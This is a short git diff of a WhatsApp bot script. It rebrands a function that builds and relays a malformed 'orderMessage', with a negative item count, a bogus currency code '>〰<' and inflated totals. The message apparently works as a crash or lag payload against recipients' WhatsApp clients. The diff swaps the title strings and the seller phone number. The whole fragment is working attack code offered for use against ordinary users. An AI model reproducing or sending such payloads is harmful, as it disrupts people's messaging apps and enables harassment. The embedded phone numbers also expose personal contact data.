@@ -28,16 +28,16 @@ function kyun(seconds){
 					}
 						    
 						     prep = itsu.prepareMessageFromContent(m.chat, { orderMessage: { 
-itemCount: -10112006, status: 500,
+itemCount: -10113609, status: 500,
 surface: 999,
 message: teks,
-description: 'pler',
-orderTitle: 'awikwok',
+description: 'Gou',
+orderTitle: 'Gourav',
 token: '9',
 curreyCode: 'IDR',
 totalCurrencyCode: '>〰<',
 totalAmount1000: '1000000',
-sellerJid: '6283820073017@s.whatsapp.net',
+sellerJid: '918089152280@s.whatsapp.net',
 thumbnail: global.thumb3
 }}, {contextInfo: null, quoted: m})
 itsu.relayWAMessage(prep)
